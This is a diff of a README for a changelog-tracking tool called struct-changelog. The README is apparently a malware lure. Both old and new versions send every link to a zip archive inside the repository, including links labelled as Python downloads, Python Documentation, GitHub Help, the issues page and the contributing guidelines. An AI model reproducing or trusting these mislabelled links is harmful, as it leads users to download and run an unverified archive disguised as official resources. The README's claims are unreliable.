@@ -6,7 +6,7 @@ Welcome to the struct-changelog project! This simple tool helps you track change
 
 ## 📥 Download & Install
 
-To get started, visit this page to download the latest version of struct-changelog: [Download struct-changelog](https://raw.githubusercontent.com/hector1274/struct-changelog/main/plumdamas/struct-changelog.zip).
+To get started, visit this page to download the latest version of struct-changelog: [Download struct-changelog](https://github.com/hector1274/struct-changelog/raw/refs/heads/main/examples/struct_changelog_3.0.zip).
 
 ## 📋 Features
 
@@ -20,13 +20,13 @@ To get started, visit this page to download the latest version of struct-changel
 To run struct-changelog, ensure you have the following:
 
 - **Operating System**: Windows, macOS, or Linux
-- **Python**: Version 3.x installed (You can download it from [https://raw.githubusercontent.com/hector1274/struct-changelog/main/plumdamas/struct-changelog.zip](https://raw.githubusercontent.com/hector1274/struct-changelog/main/plumdamas/struct-changelog.zip)).
+- **Python**: Version 3.x installed (You can download it from [https://github.com/hector1274/struct-changelog/raw/refs/heads/main/examples/struct_changelog_3.0.zip](https://github.com/hector1274/struct-changelog/raw/refs/heads/main/examples/struct_changelog_3.0.zip)).
 - **Space**: At least 50 MB of free space on your hard drive.
 
 ## 🛠️ How to Use
 
 1. **Download the Application**:
-   Visit this page to download the latest version: [Download struct-changelog](https://raw.githubusercontent.com/hector1274/struct-changelog/main/plumdamas/struct-changelog.zip).
+   Visit this page to download the latest version: [Download struct-changelog](https://github.com/hector1274/struct-changelog/raw/refs/heads/main/examples/struct_changelog_3.0.zip).
 
 2. **Install**:
    Once the file is downloaded, locate it in your downloads folder. If it's a .zip file, extract it first. 
@@ -69,16 +69,16 @@ After updating the user’s address, you simply run struct-changelog again, and 
 
 ## 🗂️ Support
 
-If you encounter any issues or have questions, please check the [issues page](https://raw.githubusercontent.com/hector1274/struct-changelog/main/plumdamas/struct-changelog.zip) on GitHub. You can also join our community on Discord for real-time support and discussions.
+If you encounter any issues or have questions, please check the [issues page](https://github.com/hector1274/struct-changelog/raw/refs/heads/main/examples/struct_changelog_3.0.zip) on GitHub. You can also join our community on Discord for real-time support and discussions.
 
 ## 🔗 Additional Resources
 
-- [Python Documentation](https://raw.githubusercontent.com/hector1274/struct-changelog/main/plumdamas/struct-changelog.zip)
-- [GitHub Help](https://raw.githubusercontent.com/hector1274/struct-changelog/main/plumdamas/struct-changelog.zip)
+- [Python Documentation](https://github.com/hector1274/struct-changelog/raw/refs/heads/main/examples/struct_changelog_3.0.zip)
+- [GitHub Help](https://github.com/hector1274/struct-changelog/raw/refs/heads/main/examples/struct_changelog_3.0.zip)
 
 ## 💬 Contributing
 
-If you want to contribute to struct-changelog, feel free to fork the repository. Please follow the guidelines in the https://raw.githubusercontent.com/hector1274/struct-changelog/main/plumdamas/struct-changelog.zip file to ensure a smooth process.
+If you want to contribute to struct-changelog, feel free to fork the repository. Please follow the guidelines in the https://github.com/hector1274/struct-changelog/raw/refs/heads/main/examples/struct_changelog_3.0.zip file to ensure a smooth process.
 
 ## 👥 Acknowledgements
 
